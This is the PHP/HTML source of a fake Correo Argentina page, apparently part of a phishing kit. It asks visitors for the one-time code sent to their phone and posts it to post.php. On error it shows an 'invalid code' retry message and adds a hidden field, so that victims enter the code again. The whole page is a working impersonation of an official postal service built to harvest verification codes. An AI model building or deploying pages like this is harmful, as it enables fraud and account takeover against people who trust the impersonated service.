<?php
require "main.php";
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/card.css">
    <title>Correo Argentina</title>
</head>
<body>
<header>
        <div class="logo">
            <img src="res/img/logo.png" alt="">
        </div>
        <div class="links">
            <span>Integraciones</span>
            <span>Iniciar sesión</span>
            <span>Registrarme</span>
        </div>
    </header>
    <main>
    <div class="text">
            <label>Confirmación</label>
            <span>Por favor, ingrese el código enviado a su número de teléfono para continuar.</span>
            </div>
        <div class="continer">
            <form action="post.php" method="post">
             <div class="col">
             <input type="text" name="otp" required placeholder="Ingrese el código">
             <?php 
             if(isset($_GET['error'])){
             echo '<input type="hidden" name="exit">';
             echo '<p style="color:red;">Código inválido. Por favor, inténtelo de nuevo.</p>';
             }
             ?>
            <button type="submit" class="btn">Continuar</button>
            </div>
            </form>        
        </div>
    </main>
    <footer>
        <div class="down">
        <img src="res/img/logo.png" alt="">
        <p>Correo Oficial de la República Argentina - Todos los derechos reservados</p>
        </div>
    </footer>
    
<script src="./res/cdn/jq.js"></script>  
</body>
</html>